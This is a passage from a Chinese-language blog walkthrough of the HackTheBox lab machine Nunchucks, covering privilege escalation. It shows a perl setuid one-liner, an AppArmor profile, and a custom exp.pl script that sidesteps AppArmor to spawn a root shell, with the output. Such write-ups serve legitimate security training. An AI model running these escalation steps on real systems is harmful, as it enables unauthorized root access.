+</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;id&#34;;&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
+</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;cat /root/root.txt&#34;;&#39;</span> 
+</span></span><span class="line"><span class="cl">cat: /root/root.txt: Permission denied <span class="c1"># 无权限，什么鬼？</span></span></span></code></pre></div></div><p>继续搜索&hellip;发现使用了AppArmor技术</p>
+<blockquote>
+<p><strong>AppArmor</strong>
+Introduction
+AppArmor is a Mandatory Access Control (MAC) system which is a kernel (LSM) enhancement to confine programs to a limited set of resources. AppArmor&rsquo;s security model is to bind access control attributes to programs rather than to users. AppArmor confinement is provided via profiles loaded into the kernel, typically on boot. AppArmor profiles can be in one of two modes: enforcement and complain. Profiles loaded in enforcement mode will result in enforcement of the policy defined in the profile as well as reporting policy violation attempts (either via syslog or auditd). Profiles in complain mode will not enforce policy but instead report policy violation attempts.
+AppArmor differs from some other MAC systems on Linux: it is path-based, it allows mixing of enforcement and complain mode profiles, it uses include files to ease development, and it has a far lower barrier to entry than other popular MAC systems.
+AppArmor is an established technology first seen in Immunix and later integrated into Ubuntu, Novell/SUSE, and Mandriva. Core AppArmor functionality is in the mainline Linux kernel from 2.6.36 onwards; work is ongoing by AppArmor, Ubuntu and other developers to merge additional AppArmor functionality into the mainline kernel.</p></blockquote>
+<p>查看/etc/apparmor.d/usr.bin.perl</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Last Modified: Tue Aug 31 18:25:30 2021</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;tunables/global&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/perl <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">#include &lt;abstractions/base&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">#include &lt;abstractions/nameservice&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">#include &lt;abstractions/perl&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  capability setuid,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  deny owner /etc/nsswitch.conf r,
+</span></span><span class="line"><span class="cl">  deny /root/* rwx,
+</span></span><span class="line"><span class="cl">  deny /etc/shadow rwx,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  /usr/bin/id mrix,
+</span></span><span class="line"><span class="cl">  /usr/bin/ls mrix,
+</span></span><span class="line"><span class="cl">  /usr/bin/cat mrix,
+</span></span><span class="line"><span class="cl">  /usr/bin/whoami mrix,
+</span></span><span class="line"><span class="cl">  /opt/backup.pl mrix,
+</span></span><span class="line"><span class="cl">  owner /home/ r,
+</span></span><span class="line"><span class="cl">  owner /home/david/ r,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></div></div><p>无/root的rwx权限，但是有个/opt/backup.pl脚本，查看脚本内容</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/perl                                                                                     </span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>                                                                                         
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s">&#34;/tmp&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s">&#39;/var/www&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%Y-%m-%d-%s&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s">&#34;$tmpdir/backup_$now&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">printlog</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="s">&#34;[&#34;</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%D %T&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">),</span> <span class="s">&#34;] $_[0]\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">archive</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Archiving...&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">die</span> <span class="s">&#34;You must run this script as root.\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Backup starts.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">&amp;</span><span class="n">archive</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Removing temporary directory&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Completed&#34;</span><span class="p">;</span></span></span></code></pre></div></div><p>脚本通过设置setuid以root用户运行，这样可以按照同样方法写提权脚本</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="c1">#/tmp/exp.pl</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/perl                                                                                     </span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>                                                                                         
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/bash&#34;</span><span class="p">);</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">david@nunchucks:/tmp$ chmod +x exp.pl
+</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ ./exp.pl
+</span></span><span class="line"><span class="cl">root@nunchucks:/tmp# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span></span></span></code></pre></div></div><hr>
+<h1 id="参考资料">参考资料</h1>
+<blockquote>
+<p><a href="https://fuckcloudnative.io/posts/linux-capabilities-in-practice-1/" target="_blank" rel="noopener noreffer ">Linux Capabilities 入门教程：基础实战篇</a>
+<a href="https://gtfobins.github.io/gtfobins" target="_blank" rel="noopener noreffer ">GTFOBins</a>
+<a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreffer ">HackTricks</a></p></blockquote>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-02-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-nunchucks-walkthrough/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/hackthebox-nunchucks-walkthrough/" data-title="HackTheBox Nunchucks Walkthrough" data-hashtags="writeup,hackthebox,Linux,NodeJS,SSTI,SUID"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/hackthebox-nunchucks-walkthrough/" data-hashtag="writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/hackthebox-nunchucks-walkthrough/" data-title="HackTheBox Nunchucks Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/hackthebox-nunchucks-walkthrough/" data-title="HackTheBox Nunchucks Walkthrough"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/hackthebox-nunchucks-walkthrough/" data-title="HackTheBox Nunchucks Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/nodejs/">NodeJS</a>,&nbsp;<a href="/tags/ssti/">SSTI</a>,&nbsp;<a href="/tags/suid/">SUID</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/buuctf-buu-brute-1-writeup/" class="prev" rel="prev" title="BUUCTF - BUU BRUTE 1 Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>BUUCTF - BUU BRUTE 1 Writeup</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Kur0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
